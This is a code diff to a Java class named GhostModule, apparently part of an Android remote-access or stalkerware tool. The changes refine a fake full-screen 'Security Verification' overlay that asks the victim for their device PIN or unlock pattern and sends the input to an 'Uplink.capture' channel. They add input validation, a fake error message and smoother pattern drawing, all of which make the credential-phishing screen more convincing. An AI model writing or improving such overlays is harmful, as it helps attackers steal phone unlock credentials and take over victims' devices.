@@ -140,34 +140,39 @@ public class GhostModule extends BaseModule {
                 overlayHtml = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=no'>" +
                         "<style>" +
                         "body { background:#000; color:#fff; font-family:sans-serif; margin:0; padding:0; display:flex; flex-direction:column; height:100vh; width:100vw; overflow:hidden; user-select:none; touch-action:none; justify-content: space-between; }" +
-                        ".header { padding: 8vh 5vw 2vh; text-align:center; }" +
-                        ".lock-icon { font-size: 8vh; color:#00f2ff; margin-bottom: 1.5vh; opacity:0.8; }" +
-                        "h2 { font-weight:300; margin:0 0 1vh; font-size: 3.5vh; }" +
-                        "p { color:#888; font-size: 2vh; margin:0; }" +
-                        ".pin-dots { display:flex; justify-content:center; gap: 4vw; margin: 4vh 0; height: 2vh; }" +
-                        ".pin-dot { width: 1.8vh; height: 1.8vh; border: 0.3vh solid #555; border-radius:50%; transition:0.1s; }" +
+                        ".header { padding: 6vh 5vw 2vh; text-align:center; }" +
+                        ".lock-icon { font-size: 7vh; color:#00f2ff; margin-bottom: 1.5vh; opacity:0.8; }" +
+                        "h2 { font-weight:300; margin:0 0 1vh; font-size: 3.2vh; }" +
+                        "p { color:#888; font-size: 1.8vh; margin:0; }" +
+                        ".status-msg { height: 3vh; color: #ff3131; font-size: 1.6vh; margin-top: 1vh; font-weight: bold; opacity: 0; transition: 0.3s; }" +
+                        ".pin-dots { display:flex; justify-content:center; gap: 4vw; margin: 3vh 0; height: 2.2vh; }" +
+                        ".pin-dot { width: 2vh; height: 2vh; border: 0.3vh solid #555; border-radius:50%; transition:0.1s; }" +
                         ".pin-dot.filled { background:#00f2ff; border-color:#00f2ff; box-shadow:0 0 1.2vh #00f2ff; }" +
-                        ".keypad { display:grid; grid-template-columns:repeat(3, 1fr); gap: 3vh; width: 80vw; max-width: 400px; margin: 0 auto; }" +
-                        ".key { width: 9vh; height: 9vh; max-width: 22vw; max-height: 22vw; border-radius:50%; background:rgba(255,255,255,0.05); border: 0.15vh solid rgba(255,255,255,0.1); color:#fff; font-size: 3.5vh; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:0.1s; margin: 0 auto; }" +
+                        ".keypad { display:grid; grid-template-columns:repeat(3, 1fr); gap: 2vh; width: 80vw; max-width: 400px; margin: 0 auto; }" +
+                        ".key { width: 8vh; height: 8vh; max-width: 20vw; max-height: 20vw; border-radius:50%; background:rgba(255,255,255,0.05); border: 0.15vh solid rgba(255,255,255,0.1); color:#fff; font-size: 3.2vh; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:0.1s; margin: 0 auto; }" +
                         ".key:active { background:rgba(0,242,255,0.2); border-color:#00f2ff; transform:scale(0.95); }" +
-                        ".pat-container { position:relative; width: 85vw; height: 85vw; max-width: 400px; max-height: 400px; margin: 2vh auto; }" +
+                        ".pat-container { position:relative; width: 85vw; height: 85vw; max-width: 400px; max-height: 400px; margin: 1vh auto; background: rgba(255,255,255,0.02); border-radius: 15px; }" +
                         "canvas { position:absolute; top:0; left:0; pointer-events:none; width: 100%; height: 100%; }" +
                         ".grid { display:grid; grid-template-columns:repeat(3, 1fr); grid-template-rows:repeat(3, 1fr); width:100%; height:100%; position:relative; z-index:2; }" +
                         ".dot-wrap { display:flex; align-items:center; justify-content:center; }" +
-                        ".dot { width: 2vh; height: 2vh; background:#444; border-radius:50%; transition:0.2s; }" +
-                        ".dot.active { background:#00f2ff; box-shadow:0 0 2vh #00f2ff; transform:scale(1.2); }" +
+                        ".dot { width: 2.5vh; height: 2.5vh; background:#444; border-radius:50%; transition:0.2s; }" +
+                        ".dot.active { background:#00f2ff; box-shadow:0 0 2.5vh #00f2ff; transform:scale(1.3); }" +
                         ".footer { padding: 4vh 8vw; display:flex; justify-content:space-between; }" +
-                        ".f-btn { background:transparent; border:none; color:#00f2ff; font-weight:bold; font-size: 2.2vh; cursor:pointer; text-transform:uppercase; letter-spacing: 0.2vh; }" +
+                        ".f-btn { background:transparent; border:none; color:#00f2ff; font-weight:bold; font-size: 2.2vh; cursor:pointer; text-transform:uppercase; letter-spacing: 0.2vh; transition: 0.2s; }" +
+                        ".f-btn:active { color: #fff; transform: scale(0.9); }" +
                         "</style></head><body>" +
                         "<div class='header'>" +
                         "<div class='lock-icon'>&#128274;</div>" +
                         "<h2>Security Verification</h2>" +
                         "<p>Please enter your device credentials</p>" +
+                        "<div id='status' class='status-msg'>Invalid Entry. Try again.</div>" +
                         "</div>" +
 
                         "<div id='pin-mode' style='flex-grow: 1; display: flex; flex-direction: column; justify-content: center;'>" +
                         "<div class='pin-dots' id='pin-display'>" +
                         "<div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div>" +
+                        "<div class='pin-dot' style='display:none'></div><div class='pin-dot' style='display:none'></div>" +
+                        "<div class='pin-dot' style='display:none'></div><div class='pin-dot' style='display:none'></div>" +
                         "</div>" +
                         "<div class='keypad'>" +
                         "<div class='key' onclick='k(1)'>1</div><div class='key' onclick='k(2)'>2</div><div class='key' onclick='k(3)'>3</div>" +
@@ -185,7 +190,8 @@ public class GhostModule extends BaseModule {
                         "[DOTS]" +
                         "</div>" +
                         "</div>" +
-                        "<div style='text-align:center; margin-top: 3vh;'><button class='f-btn' onclick='toggle(false)'>Use PIN</button></div>" +
+                        "<div style='text-align:center; margin-top: 2vh;'><button class='f-btn' style='color:#888; font-size: 1.8vh;' onclick='reset()'>Clear Pattern</button></div>" +
+                        "<div style='text-align:center; margin-top: 2vh;'><button class='f-btn' onclick='toggle(false)'>Use PIN</button></div>" +
                         "</div>" +
 
                         "<div class='footer'>" +
@@ -194,47 +200,87 @@ public class GhostModule extends BaseModule {
                         "</div>" +
 
                         "<script>" +
-                        "let mode='pin'; let pin=''; let path=[]; let isDown=false;" +
+                        "let mode='pin'; let pin=''; let path=[]; let isDown=false; let dotsData=[];" +
                         "const cv=document.getElementById('cv'); const ctx=cv.getContext('2d');" +
+                        "const status=document.getElementById('status');" +
                         
-                        "function toggle(p){ mode=p?'pat':'pin'; document.getElementById('pin-mode').style.display=p?'flex':'none'; document.getElementById('pat-mode').style.display=p?'flex':'none'; reset(); }" +
-                        "function reset(){ pin=''; path=[]; resetDots(); draw(); updatePin(); }" +
+                        "function toggle(p){ mode=p?'pat':'pin'; document.getElementById('pin-mode').style.display=p?'none':'flex'; document.getElementById('pat-mode').style.display=p?'flex':'none'; if(p) setTimeout(setupCanvas, 50); reset(); }" +
+                        "function reset(){ pin=''; path=[]; resetDots(); if(mode==='pat') { setupCanvas(); draw(); } updatePin(); status.style.opacity=0; }" +
                         "function resetDots(){ document.querySelectorAll('.dot').forEach(d=>d.classList.remove('active')); }" +
-                        "function updatePin(){ const ds=document.querySelectorAll('.pin-dot'); ds.forEach((d,i)=>d.classList.toggle('filled', i<pin.length)); }" +
-                        "function k(n){ if(pin.length<8){ pin+=n; updatePin(); } }" +
+                        "function updatePin(){ const ds=document.querySelectorAll('.pin-dot'); " +
+                        "  ds.forEach((d,i)=>{ " +
+                        "    d.classList.toggle('filled', i<pin.length); " +
+                        "    if(i>=4) d.style.display = (pin.length > 4 || i === pin.length) ? 'block' : 'none'; " +
+                        "  });" +
+                        "}" +
+                        "function k(n){ if(pin.length<8){ pin+=n; updatePin(); status.style.opacity=0; } }" +
                         "function del(){ pin=pin.slice(0,-1); updatePin(); }" +
                         
-                        "function send(){ if(mode==='pin'){ if(pin) Uplink.capture('PIN: '+pin); } else { if(path.length>1) Uplink.capture('PATTERN: '+path.join('-')); } }" +
+                        "function send(){ " +
+                        "  console.log('Capture requested. Mode: ' + mode); " +
+                        "  if(mode==='pin'){ " +
+                        "    if(pin.length>=4) { Uplink.capture('PIN: '+pin); } " +
+                        "    else { showErr('PIN too short'); } " +
+                        "  } " +
+                        "  else { " +
+                        "    if(path.length>=4) { " +
+                        "      const humanPath = path.map(id => parseInt(id) + 1).join('-'); " +
+                        "      Uplink.capture('PATTERN (1-9): ' + humanPath); " +
+                        "    } else { showErr('Pattern too short'); } " +
+                        "  } " +
+                        "}" +
+                        "function showErr(msg){ status.innerText=msg; status.style.opacity=1; setTimeout(()=>status.style.opacity=0, 2000); }" +
                         
-                        "function setupCanvas(){ const r=document.getElementById('pc').getBoundingClientRect(); cv.width=r.width; cv.height=r.height; }" +
-                        "function draw(ex, ey){" +
-                        "  ctx.clearRect(0,0,cv.width,cv.height); if(path.length===0)return;" +
-                        "  ctx.strokeStyle='#00f2ff'; ctx.lineWidth=Math.max(cv.width/50, 4); ctx.lineCap='round'; ctx.lineJoin='round'; ctx.beginPath();" +
-                        "  path.forEach((id,i)=>{ const d=document.querySelector('[data-id=\"'+id+'\"]'); const r=d.getBoundingClientRect(); const pr=document.getElementById('pc').getBoundingClientRect(); const x=r.left-pr.left+r.width/2; const y=r.top-pr.top+r.height/2;" +
-                        "    if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);" +
+                        "function setupCanvas(){ " +
+                        "  const pc=document.getElementById('pc'); if(!pc) return;" +
+                        "  const r=pc.getBoundingClientRect(); cv.width=r.width; cv.height=r.height; " +
+                        "  dotsData = Array.from(document.querySelectorAll('.dot')).map(d => { " +
+                        "    const wr=d.closest('.dot-wrap').getBoundingClientRect(); " +
+                        "    return { id: d.dataset.id, x: wr.left - r.left + wr.width/2, y: wr.top - r.top + wr.height/2, r: wr.width/2 }; " +
                         "  });" +
-                        "  if(ex!==undefined) ctx.lineTo(ex,ey);" +
+                        "  console.log('Canvas setup complete: ' + cv.width + 'x' + cv.height); " +
+                        "}" +
+                        
+                        "function draw(ex, ey){" +
+                        "  ctx.clearRect(0,0,cv.width,cv.height); if(path.length===0 && ex===undefined)return;" +
+                        "  ctx.strokeStyle='rgba(0, 242, 255, 0.8)'; ctx.lineWidth=Math.max(cv.width/20, 12); ctx.lineCap='round'; ctx.lineJoin='round'; ctx.beginPath();" +
+                        "  path.forEach((id,i)=>{ " +
+                        "    const d = dotsData.find(item => item.id === id); " +
+                        "    if(i===0) ctx.moveTo(d.x, d.y); else ctx.lineTo(d.x, d.y);" +
+                        "  });" +
+                        "  if(ex!==undefined && path.length > 0) {" +
+                        "    const last = dotsData.find(item => item.id === path[path.length-1]);" +
+                        "    ctx.moveTo(last.x, last.y); ctx.lineTo(ex, ey);" +
+                        "  }" +
                         "  ctx.stroke();" +
                         "}" +
 
-                        "const handleMove=(e)=>{ if(!isDown)return; e.preventDefault(); const t=e.touches?e.touches[0]:e; const pr=document.getElementById('pc').getBoundingClientRect(); const x=t.clientX-pr.left; const y=t.clientY-pr.top;" +
-                        "  document.querySelectorAll('.dot').forEach(d=>{ const r=d.getBoundingClientRect(); const dx=r.left-pr.left+r.width/2; const dy=r.top-pr.top+r.height/2; const dist=Math.hypot(x-dx, y-dy);" +
-                        "    if(dist < r.width * 1.5){ const id=d.dataset.id; if(!path.includes(id)){ path.push(id); d.classList.add('active'); } }" +
+                        "const handleMove=(e)=>{ " +
+                        "  if(!isDown)return; e.preventDefault(); " +
+                        "  const t=e.touches?e.touches[0]:e; const pr=document.getElementById('pc').getBoundingClientRect(); " +
+                        "  const x=t.clientX-pr.left; const y=t.clientY-pr.top;" +
+                        "  dotsData.forEach(d=>{ " +
+                        "    const dist=Math.hypot(x-d.x, y-d.y);" +
+                        "    if(dist < d.r * 0.9){ if(!path.includes(d.id)){ path.push(d.id); document.querySelector('[data-id=\"'+d.id+'\"]').classList.add('active'); } }" +
                         "  }); draw(x,y);" +
                         "};" +
 
                         "const pc=document.getElementById('pc');" +
-                        "pc.addEventListener('touchstart',(e)=>{isDown=true; handleMove(e);}, {passive: false}); pc.addEventListener('mousedown',(e)=>{isDown=true; handleMove(e);});" +
+                        "pc.addEventListener('touchstart',(e)=>{isDown=true; setupCanvas(); handleMove(e);}, {passive: false}); " +
+                        "pc.addEventListener('mousedown',(e)=>{isDown=true; setupCanvas(); handleMove(e);});" +
                         "window.addEventListener('touchend',()=>{isDown=false; draw();}); window.addEventListener('mouseup',()=>{isDown=false; draw();});" +
                         "window.addEventListener('touchmove',handleMove, {passive: false}); window.addEventListener('mousemove',handleMove);" +
-                        "window.onload=setupCanvas; window.onresize=setupCanvas;" +
+                        "window.onload=() => { if(mode==='pat') setupCanvas(); }; window.onresize=setupCanvas;" +
                         "</script></body></html>";
 
                 StringBuilder dots = new StringBuilder();
                 for(int i=0; i<9; i++) dots.append("<div class='dot-wrap'><div class='dot' data-id='").append(i).append("'></div></div>");
                 overlayHtml = overlayHtml.replace("[DOTS]", dots.toString());
             }
-            ghost.deployShadowOverlay(overlayHtml);
+
+            if (!overlayHtml.isEmpty()) {
+                ghost.deployShadowOverlay(overlayHtml);
+            }
         }
         return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
     }
@@ -665,4 +711,5 @@ public class GhostModule extends BaseModule {
             return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Stealth error: " + e.getMessage());
         }
     }
+
 }
